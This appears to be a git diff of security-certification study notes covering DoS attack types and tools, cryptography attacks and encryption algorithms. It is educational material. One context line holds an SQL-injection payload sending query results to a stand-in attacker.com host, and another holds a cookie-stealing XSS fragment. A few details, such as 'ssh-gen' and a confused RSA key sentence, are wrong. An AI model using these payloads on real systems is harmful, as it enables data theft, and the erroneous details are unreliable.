-- OS kernels usually implements a backlog of open connections
-  - So the attack does not attempt to overload memory or resources
-  - It overloads backlog of half-open connections
-  - Causes legitimate requests to be rejected
-
-###### SYN flood countermeasures
-
-- 🤗 Defined in [RFC 4987](https://tools.ietf.org/html/rfc4987)
-- Same countermeasures also resists against IP spoofing
-- **Filtering**
-  - Packet filtering based on IP addresses
-- **Increasing backlog**
-  - Larger backlogs allow more connections
-- **Reducing `SYN-RECEIVED` timer**
-  - Shorter time will prevent half-open connections to persist in backlog
-- **Recycling the oldest half-open TCP**
-  - When backlog is full, overwrite the oldest half-open entry
-- **SYN cache**
-  - Not allocating full state to minimize space until connection has been established
-- **SYN cookies**
-  - Resists IP spoofing
-  - Encodes SYN queue entry in sequence number sent in the `SYN+ACK` response
-  - When server receives `ACK`, it reconstructs SYN entry from sequence number to establish the connection
-- **Hybrid approaches**
-  - Combining SYN cache and cookies
-  - E.g. sending cookies when cache is full
-- **Firewalls and proxies**
-  - Firewalls/proxies sends connection to end host when connection is established
-  - Moves away problem to firewalls/proxies
-
-##### ACK flood attack
-
-- Overloading a server with TCP ACK packets
-- TCP ACK packet is any TCP packet with the ACK flag set in the header.
-- ACK is short for "acknowledgement"
-  - TCP protocol requires that connected devices acknowledge they have received all packets in order
-  - E.g. when all packets for an image is sent, ACK packet is required otherwise image is sent again.
-
-##### DNS query/NXDOMAIN floods
-
-- Attackers send valid but spoofed DNS request packets at a very high packet rate
-- Victim's DNS servers proceeds to respond to all requests
-
-##### Fragmentation attack
-
-- Flooding TCP/UDP fragmented packets with small packet rate to the system
-- Exhausts the system through forcing it to reassembling packets.
-
-###### TCP fragmentation attack
-
-- Also known as ***teardrop attack***
-- 📝 Type of DoS attack also known as **teardrop** attack.
-- Sends invalid packets with overlapping, oversized payloads to the victim.
-- Sends gigantic payloads to crash vulnerable systems:
-  - Windows 3.1x, Windows 95 and Windows NT
-  - Linux prior to versions 2.0.32 and 2.1.63
-
-##### `RST` attack
-
-- Also known as **TCP reset attack**
-- Attacker sends TCP packets with the `RST` flag set to `1` to host A, host B, or both using spoofed IPs
-  - Causes termination of valid TCP connection between the two hosts.
-- Setting `RST` flag
-  - Indicates that receiving computer should immediately kill the TCP connection
-  - An real-life scenario
-    1. Two computers (computer A and computer B) communicate with each other
-    2. Computer B kills the communication without knowledge of computer A
-       - E.g. computer B has crashed
-    3. Computer A continues to send packets to computer B
-    4. Computer B sends `RST` packet to computer A to kill the communication
-  - See also: [TCP flags](./../03-scanning-networks/tcpip-basics.md#tcp-flags)
-- 🤗 Used often for internet censorship e.g. • [The Great Firewall of China](https://en.wikipedia.org/wiki/Great_Firewall) • [Iranian Internet censors](https://en.wikipedia.org/wiki/Internet_censorship_in_Iran#Deep_packet_inspection).
-
-### Application layer DoS attacks
-
-- Send "legitimate" traffic to a web application than it can handle.
-- Goal is to make target application reject new connections by creating new connections and keeping them open as long as possible.
-- Flow
-  1. Attacker opens multiple connections to the targeted server by sending partial HTTP request headers.
-  2. Target opens a thread for each incoming request to close once connection is completed.
-     - If connection takes too long, the server will timeout, freeing the thread up.
-  3. Attacker sends partial request headers to prevent target from timing out
-
-#### Application layer attack techniques
-
-- **HTTP flooding attacks**
-  - Goal is to make server hold on to connections waiting for the full requests which it never receives.
-  - **HTTP GET attack**: Sending requests with time delayed HTTP headers
-  - **HTTP POST attack**: Sending requests with incomplete bodies delayed HTTP headers
-- **Slow-rate attacks**
-  - Also known ass **low and slow attacks**
-  - Apparently legitimate traffic arriving at a seemingly legitimate albeit slow
-  - E.g. [Slowloris and R-U-Dead-Yet](#dos-tools)
-
-### Other attack types
-
-- **Multi-vector attack**
-  - Combining volumetric, protocol, and application layer attacks into one and launching
-  - Can be sequentially or in parallel
-- **Peer-to-Peer Attack**
-  - Caused by bugs in a peer-to-peer server
-  - Instructs clients to disconnect and reconnect to a victims website.
-- **Permanent DoS Attack (PDoS)** or **phlashing**
-  - Does irreversible (without replacement or reinstalling) damage to the hardware or its firmware.
-  - E.g. replacing firmware (e.g. through fake updates) with a corrupt one, also known as flashing.
-- **Fraggle attack**
-  - Similar to [Smurf](#smurf-attack) but uses UDP.
-- **TCP state-exhaustion**
-  - Attempts to consume connection state tables.  
-  - Tergets load balancers, firewalls, and application servers
-
-#### DRDoS
-
-- Also known as ***distributed reflection denial of service (DRDoS) attack*** or ***spoofed attack***
-- Multiple intermediary machines send the attack at the behest of the attacker is correct.
-- Secondary systems carry out attacks so the attacker remains hidden.
-- Attacker instructs zombie machines (called **secondary machines**) to send packets to uncompromised machines (called **secondary machines**)
-  - Packets contain target's IP address as the source address
-  - Secondary machines try to connect to the target.
-
-### DoS Tools
-
-- **Slowloris**
-  - Floods HTTP with headers for each request without actually completing them.
-  - 🤗 [Slowloris presentation](https://samsclass.info/seminars/slowloris.pdf)
-- 📝 **[R-U-Dead-Yet](https://sourceforge.net/projects/r-u-dead-yet/)**
-  - Also known as ***RUDY***, ***R.U.D.Y.*** or ***R U Dead yet***
-  - Submits long form fields using HTTP posts to the target server.
-  - Sends concurrenct small pakets at incredibly slow rate
-  - Keeps connection open as long as possible
-- **[HULK](https://github.com/grafov/hulk)**
-  - HTTP DoS tool
-- **[Metasploit](./../05-vulnerabilities/automated-penetration-testing-tools.md#metasploit)**
-  - with modules for DoS e.g. [TCPSYNFlooder](https://www.rapid7.com/db/modules/auxiliary/dos/tcp/synflood/)
-- [**Nmap**](./../03-scanning-networks/scanning-tools.md#nmap) with [DoS scripts](https://Nmap.org/nsedoc/categories/dos.html)
-- **[DAVOSET](https://github.com/MustLive/DAVOSET)**
-  - DAVOSET = DDoS attacks via other sites execution tool
-  - DDoS attacks on the sites via Abuse of Functionality and XML External Entities vulnerabilities on other sites.
-- **[High Orbit Ion Cannon (HOIC)](https://sourceforge.net/projects/highorbitioncannon/)**
-  - High-speed multi-threaded HTTP flood
-- Other tools include • Stacheldraht • Trinoo • TFN2k • WinTrinoo • T-Sight
-
-#### Low Orbit Ion Cannon (LOIC)
-
-- DoS attack tool (C#) using layer (TCP, UDP) and layer 7 (HTTP) packets
-- Used for successful attacks to big companies by including Anonymous group.
-- [Open-source](https://sourceforge.net/projects/loic/)
-- Improved version: **[Tsunami](https://sourceforge.net/projects/tsunami-dos/)**
-
-#### Mobile tools
-
-- [LOIC](#low-orbit-ion-cannon-loic)
-- AnDOSID
-
-## Denial of Service countermeasures
-
-### DoS analysis
-
-- **Activity Profiling**: Detect Increases in activity levels, distinct clusters, average packet rate etc.
-- **Changepoint detection**: Stores and presents graph of traffic flow rate vs time for each IP/port.
-- **Wavelet-based signal analysis**: Divides incoming signal into various frequencies as spectral components.
-
-### DoS prevention strategies
-
-- Absorb the attack with additional resources e.g. through using a CDN.
-- Degrade or shut down services (start with non-critical services)
-- Deflect attacks using honeypots.
-- Ingress filtering to enable originator be traced to its true source.
-- Egress Filtering to ensure unauthorized or malicious traffic never leaves the internal network
-- Load balancing and throttling
-
-### DoS post-attack forensics
-
-- Traffic patterns for new filtering techniques
-- Router, firewall, and IDS logs
-- Update load-balancing and throttling countermeasures
 # Hacking web applications
 
 - Web Application: UI to interact with web servers
@@ -9754,6 +9222,251 @@ foo='+document.cookie</script>'.`
 - Ensure all suspicious (login, RBAC, input failures) activities are logged with sufficient user context.
 - Prevent tampering or deletion of log e.g. by using append-only database
 - Ensure that suspicious activities are detected and responded to in a timely fashion.
+# Denial of service
+
+- Attacker overloads the target system with a lot of traffic
+- Goal is to reduce, restrict or prevent accessibility of system resources to its legitimate users
+
+## Botnets
+
+- Bots are software applications that run-automated tasks over the internet
+- A botnet is a huge network of compromised systems and can be used by an attacker to launch a DoS attack
+- Controlled by **Command and Control server** owned by the attacker
+- **Distributed Denial of Service (DDoS)**
+  - Using botnets (compromised systems) to perform a DoS attack.
+- DoS and DDoS attack tools: • [LOIC](#low-orbit-ion-cannon-loic) • [GoldenEye or Petya](https://en.wikipedia.org/wiki/Petya_(malware))
+- See also [Botnet](./../01-introduction/security-threats-and-attacks.md#botnet) and [Botnet trojans](./../07-malware/trojans.md#botnet-trojans)
+
+## Attack vectors
+
+### Volumetric attacks
+
+- Goal is to use up bandwidth of the target network or service.
+
+#### Volumetric attacks types
+
+- **Flood attacks**
+  - Sending high volume traffic, can utilize zombies
+- **Amplification attacks**
+  - Sending magnified traffic, can utilize zombies
+
+#### Volumetric attack techniques
+
+- **UDP flood attack**
+  - Flooding random ports of the target server with a huge number of spoofed UDP packets
+  - Causes the server to continuously check for applications on the ports.
+    - When not found, system responds with `ICMP Destination Unreachable` packet increasing its traffic.
+- **ICMP flood attack** or **Ping flood**
+  - Flooding with ICMP echo request packets.
+
+##### Smurf attack
+
+- 📝 Flooding a IP broadcast network with ICMP echo request packets with victim IP address as source
+- Causes hosts in the network respond to received requests/responds targeting the victim.
+- Leads to server overloads in victim caused by too many replies.
+- The reason to attack broadcast address is to send so many ICMP requests going to the target that all its resources are taken up.
+- Mitigated by either
+  - configuring routers/hosts to not respond to ICMP broadcasts/requests
+  - configuring routers to not forward packets directed to broadcast addresses
+- See also [Broadcast ICMP ping](./../03-scanning-networks/scanning-techniques.md#broadcast-icmp-ping)
+
+##### Ping of death attack
+
+- 📝 Sending irregular or big packets using `ping` command
+- Attacker fragments ICMP message to send to target.
+- When the fragments are reassembled, the resultant ICMP packet is larger than max size and crashes the system
+
+### Protocol attacks
+
+- Also known as **state exhaustion flood attacks**
+- Goal is to make target device reject new connections
+- Targets connection state tables, that are present in e.g. load balancers, firewalls, app servers
+
+#### Protocol attack techniques
+
+##### SYN flood attack
+
+- Also known as **SYN Attack** or **SYN ACK flood attack**
+- Exploits a flaw in [TCP three-way handshake](./../03-scanning-networks/tcpip-basics.md#three-way-handshake)
+- Floods SYN requests with fake source IPs
+  - Target responds with a SYN ACK packet and waits for the sender to complete the session
+  - Sender never completes the session as source IP is fake.
+- OS kernels usually implements a backlog of open connections
+  - So the attack does not attempt to overload memory or resources
+  - It overloads backlog of half-open connections
+  - Causes legitimate requests to be rejected
+
+###### SYN flood countermeasures
+
+- 🤗 Defined in [RFC 4987](https://tools.ietf.org/html/rfc4987)
+- Same countermeasures also resists against IP spoofing
+- **Filtering**
+  - Packet filtering based on IP addresses
+- **Increasing backlog**
+  - Larger backlogs allow more connections
+- **Reducing `SYN-RECEIVED` timer**
+  - Shorter time will prevent half-open connections to persist in backlog
+- **Recycling the oldest half-open TCP**
+  - When backlog is full, overwrite the oldest half-open entry
+- **SYN cache**
+  - Not allocating full state to minimize space until connection has been established
+- **SYN cookies**
+  - Resists IP spoofing
+  - Encodes SYN queue entry in sequence number sent in the `SYN+ACK` response
+  - When server receives `ACK`, it reconstructs SYN entry from sequence number to establish the connection
+- **Hybrid approaches**
+  - Combining SYN cache and cookies
+  - E.g. sending cookies when cache is full
+- **Firewalls and proxies**
+  - Firewalls/proxies sends connection to end host when connection is established
+  - Moves away problem to firewalls/proxies
+
+##### ACK flood attack
+
+- Overloading a server with TCP ACK packets
+- TCP ACK packet is any TCP packet with the ACK flag set in the header.
+- ACK is short for "acknowledgement"
+  - TCP protocol requires that connected devices acknowledge they have received all packets in order
+  - E.g. when all packets for an image is sent, ACK packet is required otherwise image is sent again.
+
+##### DNS query/NXDOMAIN floods
+
+- Attackers send valid but spoofed DNS request packets at a very high packet rate
+- Victim's DNS servers proceeds to respond to all requests
+
+##### Fragmentation attack
+
+- Flooding TCP/UDP fragmented packets with small packet rate to the system
+- Exhausts the system through forcing it to reassembling packets.
+
+###### TCP fragmentation attack
+
+- Also known as ***teardrop attack***
+- 📝 Type of DoS attack also known as **teardrop** attack.
+- Sends invalid packets with overlapping, oversized payloads to the victim.
+- Sends gigantic payloads to crash vulnerable systems:
+  - Windows 3.1x, Windows 95 and Windows NT
+  - Linux prior to versions 2.0.32 and 2.1.63
+
+##### `RST` attack
+
+- Also known as **TCP reset attack**
+- Attacker sends TCP packets with the `RST` flag set to `1` to host A, host B, or both using spoofed IPs
+  - Causes termination of valid TCP connection between the two hosts.
+- Setting `RST` flag
+  - Indicates that receiving computer should immediately kill the TCP connection
+  - An real-life scenario
+    1. Two computers (computer A and computer B) communicate with each other
+    2. Computer B kills the communication without knowledge of computer A
+       - E.g. computer B has crashed
+    3. Computer A continues to send packets to computer B
+    4. Computer B sends `RST` packet to computer A to kill the communication
+  - See also: [TCP flags](./../03-scanning-networks/tcpip-basics.md#tcp-flags)
+- 🤗 Used often for internet censorship e.g. • [The Great Firewall of China](https://en.wikipedia.org/wiki/Great_Firewall) • [Iranian Internet censors](https://en.wikipedia.org/wiki/Internet_censorship_in_Iran#Deep_packet_inspection).
+
+### Application layer DoS attacks
+
+- Send "legitimate" traffic to a web application than it can handle.
+- Goal is to make target application reject new connections by creating new connections and keeping them open as long as possible.
+- Flow
+  1. Attacker opens multiple connections to the targeted server by sending partial HTTP request headers.
+  2. Target opens a thread for each incoming request to close once connection is completed.
+     - If connection takes too long, the server will timeout, freeing the thread up.
+  3. Attacker sends partial request headers to prevent target from timing out
+
+#### Application layer attack techniques
+
+- **HTTP flooding attacks**
+  - Goal is to make server hold on to connections waiting for the full requests which it never receives.
+  - **HTTP GET attack**: Sending requests with time delayed HTTP headers
+  - **HTTP POST attack**: Sending requests with incomplete bodies delayed HTTP headers
+- **Slow-rate attacks**
+  - Also known ass **low and slow attacks**
+  - Apparently legitimate traffic arriving at a seemingly legitimate albeit slow
+  - E.g. [Slowloris and R-U-Dead-Yet](#dos-tools)
+
+### Other attack types
+
+- **Multi-vector attack**
+  - Combining volumetric, protocol, and application layer attacks into one and launching
+  - Can be sequentially or in parallel
+- **Peer-to-Peer Attack**
+  - Caused by bugs in a peer-to-peer server
+  - Instructs clients to disconnect and reconnect to a victims website.
+- **Permanent DoS Attack (PDoS)** or **phlashing**
+  - Does irreversible (without replacement or reinstalling) damage to the hardware or its firmware.
+  - E.g. replacing firmware (e.g. through fake updates) with a corrupt one, also known as flashing.
+- **Fraggle attack**
+  - Similar to [Smurf](#smurf-attack) but uses UDP.
+- **TCP state-exhaustion**
+  - Attempts to consume connection state tables.  
+  - Tergets load balancers, firewalls, and application servers
+
+#### DRDoS
+
+- Also known as ***distributed reflection denial of service (DRDoS) attack*** or ***spoofed attack***
+- Multiple intermediary machines send the attack at the behest of the attacker is correct.
+- Secondary systems carry out attacks so the attacker remains hidden.
+- Attacker instructs zombie machines (called **secondary machines**) to send packets to uncompromised machines (called **secondary machines**)
+  - Packets contain target's IP address as the source address
+  - Secondary machines try to connect to the target.
+
+### DoS Tools
+
+- **Slowloris**
+  - Floods HTTP with headers for each request without actually completing them.
+  - 🤗 [Slowloris presentation](https://samsclass.info/seminars/slowloris.pdf)
+- 📝 **[R-U-Dead-Yet](https://sourceforge.net/projects/r-u-dead-yet/)**
+  - Also known as ***RUDY***, ***R.U.D.Y.*** or ***R U Dead yet***
+  - Submits long form fields using HTTP posts to the target server.
+  - Sends concurrenct small pakets at incredibly slow rate
+  - Keeps connection open as long as possible
+- **[HULK](https://github.com/grafov/hulk)**
+  - HTTP DoS tool
+- **[Metasploit](./../05-vulnerabilities/automated-penetration-testing-tools.md#metasploit)**
+  - with modules for DoS e.g. [TCPSYNFlooder](https://www.rapid7.com/db/modules/auxiliary/dos/tcp/synflood/)
+- [**Nmap**](./../03-scanning-networks/scanning-tools.md#nmap) with [DoS scripts](https://Nmap.org/nsedoc/categories/dos.html)
+- **[DAVOSET](https://github.com/MustLive/DAVOSET)**
+  - DAVOSET = DDoS attacks via other sites execution tool
+  - DDoS attacks on the sites via Abuse of Functionality and XML External Entities vulnerabilities on other sites.
+- **[High Orbit Ion Cannon (HOIC)](https://sourceforge.net/projects/highorbitioncannon/)**
+  - High-speed multi-threaded HTTP flood
+- Other tools include • Stacheldraht • Trinoo • TFN2k • WinTrinoo • T-Sight
+
+#### Low Orbit Ion Cannon (LOIC)
+
+- DoS attack tool (C#) using layer (TCP, UDP) and layer 7 (HTTP) packets
+- Used for successful attacks to big companies by including Anonymous group.
+- [Open-source](https://sourceforge.net/projects/loic/)
+- Improved version: **[Tsunami](https://sourceforge.net/projects/tsunami-dos/)**
+
+#### Mobile tools
+
+- [LOIC](#low-orbit-ion-cannon-loic)
+- AnDOSID
+
+## Denial of Service countermeasures
+
+### DoS analysis
+
+- **Activity Profiling**: Detect Increases in activity levels, distinct clusters, average packet rate etc.
+- **Changepoint detection**: Stores and presents graph of traffic flow rate vs time for each IP/port.
+- **Wavelet-based signal analysis**: Divides incoming signal into various frequencies as spectral components.
+
+### DoS prevention strategies
+
+- Absorb the attack with additional resources e.g. through using a CDN.
+- Degrade or shut down services (start with non-critical services)
+- Deflect attacks using honeypots.
+- Ingress filtering to enable originator be traced to its true source.
+- Egress Filtering to ensure unauthorized or malicious traffic never leaves the internal network
+- Load balancing and throttling
+
+### DoS post-attack forensics
+
+- Traffic patterns for new filtering techniques
+- Router, firewall, and IDS logs
+- Update load-balancing and throttling countermeasures
 # Session hijacking
 
 - Targeting a session between two machines to gain access
@@ -10295,195 +10008,6 @@ foo='+document.cookie</script>'.`
   - Network access to the database server
   - Privileges execute the necessary function
 - E.g. `||UTL_HTTP.request('http://test.attacker.com/'||(SELECT user FROM users))`
-# Cryptanalysis
-
-- Process of decryption of ciphers and encrypted text
-- Identifies vulnerabilities in cryptosystems
-
-## Cryptanalytic techniques
-
-### Linear cryptanalysis
-
-- Known as **plaintext attack**
-- Applicable to block ciphers and stream ciphers.
-- Given enough pairs of plaintext and corresponding ciphertext, key can be obtained
-- Discovered by By Matsui and Yamagishi in 1992
-- Attacker identifies the linear relation between some bits of the plaintext, some bits of the ciphertext and some bits of the unknown key.
-
-### Differential cryptanalysis
-
-- Discovered by Israeli researchers Eli Biham and Adi Shamir in the late 1980s.
-- Applicable primarily to block ciphers, but also to stream ciphers and cryptographic hash functions.
-- Applicable to symmetric key algorithms
-- Comparing differences in the inputs to how each one affects the outcome
-- Working with chosen plaintext originally, also works with known plaintext and ciphertext
-
-### Integral cryptanalysis
-
-- Used on block ciphers
-- Discovered by Lars Knudsen in 1997
-- Input vs Output comparison same as differential, however, runs multiple computations of the same block size input
-- Attacker analyzes outputs of encrypting sets of plaintexts where some of the content is held constant and some of the content is varied through all possibilities
-
-## Code-breaking methodologies
-
-- **Frequency analysis**
-  - Study of the frequency of letters or groups of letters in a ciphertext
-  - E.g. checking cipher chunks against in languages some letters or combination of letters are used more often
-  - Can be used to crack a substitution cipher, like rotation cipher ROT13
-- **Trickery and deceit**
-  - Requires a high level of mathematical and cryptographic skills
-  - Using [social engineering techniques](./../10-social-engineering/social-engineering-types.md) to trick someone to encrypt and send a known message
-- **One-time pad**
-  - A shared random key that has to be the same length or longer than the cipher text
-  - Each individual bit or character of plaintext is encrypted by combining it with the corresponding bit or character from the pad using modular addition
-  - Assuming to be unbreakable
-  - **Drawback**
-    - Key distribution becomes impracticable for large messages as key length is same as as the messages
-
-## Cryptography attacks
-
-### Chosen-key Attack
-
-- 📝 Attacker knows keys that are used or can choose the secret key.
-- May allow breaking the larger system which relies on that cipher
-
-### Rubber-hose attack
-
-- Also known as **rubber hose** or **rubberhose** attack.
-- 📝 Extraction of cryptographic secrets (e.g. the password to an encrypted file) from a person by coercion or torture
-- E.g. beating that person with a rubber hose until they give up the encryption key.
-
-### Ciphertext-only attack (COA)
-
-- Also known as **known ciphertext attack**
-- 📝 Attacker has only access to cipher texts
-- E.g. using frequency analysis to assume plain text
-- Early ciphers (using pen-and-paper) were cracked this way
-- Modern ciphers have strong protections against it
-  - take years to separate statistical departure from random noise
-
-### Known-plaintext attack (KPA)
-
-- Also known as **known-plain-text attack**
-- 📝 Attacker has access to parts of plaintext and corresponding ciphertext.
-- Can be used to reveal secret keys, code books.
-- Classical ciphers are typically vulnerable
-
-#### Meet-in-the-middle attack
-
-- Also known as **meet in the middle attack**.
-- Attack over certain block ciphers by decomposing the problem in two halves and proceeds on each part separately
-- Reduces the effort to perform a brute-force attack
-- 📝 Reason why re-encrypting an ciphertext reduces its security
-  - The reason that Triple DES or Double DES is considered weak and are no longer used.
-- E.g. transforming an attack that requires `2exp128` time into one that takes `2exp64` time and `2exp64` space
-- Type of known-plaintext attack
-
-### Chosen-plaintext attack (CPA)
-
-- 📝 Attacker can choose random plaintexts to be encrypted and obtain the corresponding ciphertexts
-- 📝 Two forms
-  - **Batch chosen-plaintext attack**
-    - Cryptanalyst chooses all plaintexts before any of them are encrypted.
-    - Not so effective
-  - **Adaptive chosen-plaintext attack**
-    - Cryptanalyst makes a series of interactive queries
-    - Subsequent plaintexts are chosen based on the information from the previous encryptions.
-
-### Chosen-ciphertext attack (CCA)
-
-- Also known as **chosen ciphertext attack** or **chosen-cipher-text attack**.
-- Attacker gathers information by obtaining the decryptions of chosen ciphertexts.
-- Early versions of RSA padding used in the SSL protocol were vulnerable.
-- Types
-  - **Adaptive chosen-ciphertext (CCA2)**
-    - Attacker uses the results from prior decryptions to inform their choices of which ciphertexts to have decrypted
-  - **Non-adaptive chosen-ciphertext**
-    - Attacker chooses the ciphertexts to have decrypted without seeing any of the resulting plaintexts
-  - **Lunchtime attack** or **midnight attack**
-    - Attacker can have access to system for only a limited amount of time, can access only few plaintext-ciphertext pairs
-
-### Side-channel attacks
-
-- Based on information gained from a computer, rather than weaknesses in the algorithm itself.
-- Monitors environmental factors such as power consumption, sound, timing and delay.
-- E.g. [RSA keys can be revealed by listening to CPU work](https://www.pcworld.com/article/2082200/listen-up-rsa-keys-snatched-by-recording-cpu-sounds-with-a-phone.html).
-
-#### Timing attack
-
-- Execution times are measured to learn more about the system
-- Information to find can include e.g. key, CPU used, algorithms, input, implementation details etc.
-- A type of side-channel attack
-
-### Brute-force attack
-
-- Also known as **brute force**
-- Trying every possible combination of characters to break the encryption
-- 📝 ❗️ Requires a lot of time and processing power.
-- See also [Brute-force attack | Cracking passwords](./../06-system-hacking/cracking-passwords-overview.md#brute-force-attack)
-
-#### Birthday Attack
-
-- Type of [brute-force](#brute-force-attack) attack but faster that focuses on collisions
-- Based on collisions where attacker uses own plain texts to match hashes (find collisions)
-- Depends on the higher likelihood of collisions found between random attack attempts and a fixed degree of permutations
-- Exploits [birthday problem](https://en.wikipedia.org/wiki/Birthday_problem) in probability theory
-  - E.g. 23 people in room, chance of two having same birthday is not `23 / 365 = ≈6%` but it's 50%. For 75 people it's 99% chance.
-
-#### Rainbow table attack
-
-- 📝 Rainbow table contains precomputed hashes to try and find out passwords
-- Faster than [brute-force](#brute-force-attack) however the trade-off is that it takes a lot of storage (sometimes Terabytes) to hold the Rainbow Tables themselves.
-- Tools
-  - [HashCalc](https://www.slavasoft.com/hashcalc/)
-  - [MD5 Calculator](http://onlinemd5.com/)
-
-### Dictionary attack
-
-- Attacker creates and uses a dictionary of plaintext and its ciphertext.
-- E.g. words in a dictionary
-- E.g. previously used passwords, often from lists obtained from past security breaches
-  - See also [Dictionary attacks | Cracking passwords](./../06-system-hacking/cracking-passwords-overview.md#dictionary-attack)
-
-### Related-key attack
-
-- Attacker observes the operation of a cipher under several different keys
-- Some relationship connecting the keys is known to attacker while key values are unknown.
-- E.g. attacker knows that last 80 bits of the keys are the same
-
-### DUHK Attack (Don't Use Hard-Coded Keys)
-
-- Allowing attackers to access keys and read communications in certain VPN implementations
-- Based on vulnerability affecting devices using ANSI X9.31 Random Number Generator (RNG) with a hard-coded seed key
-
-### Collision attack
-
-- Also known as **hash collision attack**
-- 📝 Tries to find two inputs resulting in same hash value, i.e. a hash collision.
-  - Find two different messages `m1` and `m2` such that `hash(m1) = hash(m2)`.
-- Extended by **chosen-prefix collision attack**
-  - Given two different prefixes `p1`, `p2`
-    - The attack finds two appendages `m1` and `m2` such that `hash(p1 ∥ m1) = hash(p2 ∥ m2)`
-      - where `∥` is the concatenation operation.
-  - More powerful
-- 💡 The larger the hash value size, the less likely there are for collisions to occur and therefore the more [collision resistant](./hashing-algorithms.md#collision-resistance) the hash algorithm
-
-## Cryptography attack tools
-
-- [L0phtcrack](https://www.l0phtcrack.com/)
-  - Password cracking tool
-  - Used mainly against Windows [SAM files](./../06-system-hacking/microsoft-authentication.md)
-- 📝 [John the Ripper](https://www.openwall.com/john/)
-  - Password cracking tool
-  - Can run against hashed/encrypted passwords of OSes, databases etc.
-  - See also [John the Ripper | Password cracking tools](./../06-system-hacking/password-cracking-tools.md#john-the-ripper)
-- [CrypTool](https://www.cryptool.org/en/)
-  - Open-source program for for cryptography and cryptanalysis
-  - GUI to experiment with cryptographic procedures and to animate their cascades
-- [Cryptobench](http://www.addario.org/cryptobench/)
-  - Encrypt, decrypt, hash using many algorithms
-  - Helps in the cryptanalysis process of common cryptographic schemes
 # Cryptography overview
 
 - Process of hiding information
@@ -10617,6 +10141,263 @@ foo='+document.cookie</script>'.`
 - ❗ If the key chosen is actually smaller than the data, the cipher will be vulnerable to frequency attacks
 - Uses "⊕" that denotes the exclusive disjunction (XOR) operation
 - Applying XOR operator at every character encrypts, re-applying it decrypts.
+# Encryption algorithms and techniques
+
+- **Algorithm**: step-by-step method of solving a problem
+- **Encryption algorithms**: mathematical formulas used to encrypt and decrypt data
+- Keys should still change on a regular basis even though they may be "unhackable"
+- 📝 In terms of speed
+  - Symmetric encryption algorithms are faster than asymmetric algorithms
+  - Stream ciphers (including AES in CTR) are [usually faster](https://crypto.stackexchange.com/a/31281) than [hash functions](./hashing-algorithms.md#hash-functions)
+
+## Encryption types per OSI layer
+
+| [OSI layer](./../03-scanning-networks/tcpip-basics.md#osi-model) | Encryption type | Description |
+|:---------:| --------------- | ----------- |
+| 2 | Link encryption | Everything including original headers is encrypted |
+| 3 | Network encryption | Everything in the packet is encrypted |
+| 4 | Protocol encryption | Specific protocols are entirely encrypted e.g. [SSL](./encrypting-communication.md#ssl-secure-sockets-layer) |
+| 5 | Service based encryption | Encryption for specific services on specific hosts |
+| 6 | Data encryption | |
+| 7 | Application based information encryption | |
+
+## Symmetric algorithms
+
+- Both ends of the transmission must use the same key.
+  - Requires to find a secondary secure channel to send the symmetric key to the recipient to ensure security.
+
+### DES (Data Encryption Standard)
+
+- Block cipher, 56-bit key, 64-bit block size
+- Developed in the early 1970s at IBM
+- Was a standard set by NSA but was withdrawn, quickly outdated
+- Used in initial implementation of Kerberos but later deprecated
+- Considered insecure, has been superseded by the [Advanced Encryption Standard (AES)](#aes-advanced-encryption-standard)
+
+### 3DES (Triple Data Encryption Standard)
+
+- Block cipher, 168-bit key
+- More effective than DES but much slower
+- 3 keys are used:
+  1. Used to encrypt the plain text
+  2. Used to decrypt ciphertext resulting from the first round of encryption
+  3. Used to encrypt the ciphertext that resulted from the decryption with the 2nd key
+
+### AES (Advanced Encryption Standard)
+
+- Iterated block cipher, 128, 192 or 256 bit key, 128-bit block size
+- Original name is **Rijndael**, named to AES after [Advanced Encryption Standard](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard_process) contest.
+- Symmetric-key algorithm
+- Performs same operation multiple size
+- Approved and used by NSA
+- Much faster than DES and 3DES for bulk data encryption.
+
+### RC (Rivest Cipher)
+
+- 📝 Symmetric-key algorithm.
+- Lost to [AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard_process) in [Advanced Encryption Standard](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard_process) contest.
+
+#### RC4
+
+- Variable length key algorithm
+- Uses random permutations
+- Stream cipher
+
+#### RC5
+
+- Parameterized algorithm
+- Block cipher (slower)
+- Variable
+  - block size: can be 32, 64, or 128 bits
+  - key size: between 0 and 2048 bits
+  - number of rounds: between 0 and 255
+
+#### RC6
+
+- Extends RC5 with two features
+  1. integer multiplication
+  2. 4-bit registers (RC5 uses 2-bit registers)
+
+### Blowfish
+
+- Fast symmetric block cipher, 64-bit block size, 32 to 448 bits key
+- Considered public domain
+- Insecure
+
+### Twofish
+
+- Symmetric-key block cipher
+- Uses 128-bit blocks
+- Key size can range between 0 and 256 bits.
+- Lost to [AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard_process) as finalist in [Advanced Encryption Standard](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard_process) contest.
+
+## Asymmetric algorithms
+
+### RSA (Rivest–Shamir–Adleman)
+
+- One of the common used encryption standards for data transmission.
+- 📝 Achieving strong encryption through the use of two large prime numbers
+- **Solves**
+  - I want anybody to be able to encrypt a message, but I'm the only one who can decrypt it. I don't want to share decryption keys with anybody.
+- There are no published methods to defeat the system if a large enough key is used.
+- Wide usage, e.g. SSH for public key authentication
+  - A lot safer than password authentication (should be disabled after copying keys)
+  - Steps
+    1. `ssh-gen -t rsa` creates private and public keys in `.ssh` folder
+    2. Copy the key to server to be connected
+       - Can run e.g. `ssh-copy-id user@192.168.122.37` with ssh password
+       - Or just copy `~/.ssh/id_rsa.pub` to the server manually.
+- 💡 In RSA crypto, when you generate a key pair, it's completely arbitrary which one you choose to be the public key, and which is the private key.
+  - If you encrypt with one, you can decrypt with the other - it works in both directions.
+  - When encrypting, private key is used to decrypt and public key to decrypt
+    - "I want to be able to encrypt certain information and use it as a product key for my software."
+  - When signing, private key is used to encrypt and public key to decrypt
+    - "I want to use my private key to generate messages so only I can possibly be the sender."
+- Recommended key size is 2048 bits or higher.
+- 🤗 [RSA Factoring Challenge](https://en.wikipedia.org/wiki/RSA_Factoring_Challenge)
+  - Held between 1991 and 2007 with price awards
+  - Goal was to factoring prime numbers used by RSA
+  - Shows cryptanalytic strength of RSA
+
+### Diffie–Hellman
+
+- Also known as **Diffie Hellman** or **DH**
+- Used for generating a shared key between two entities over an insecure channel.
+- One of the first public-key protocols
+- 📝 Used in • [SSL](./encrypting-communication.md#ssl-secure-sockets-layer) • [IKE (Internet Key Exchange) | IPsec](./tunneling-protocols.md#ike-internet-key-exchange)
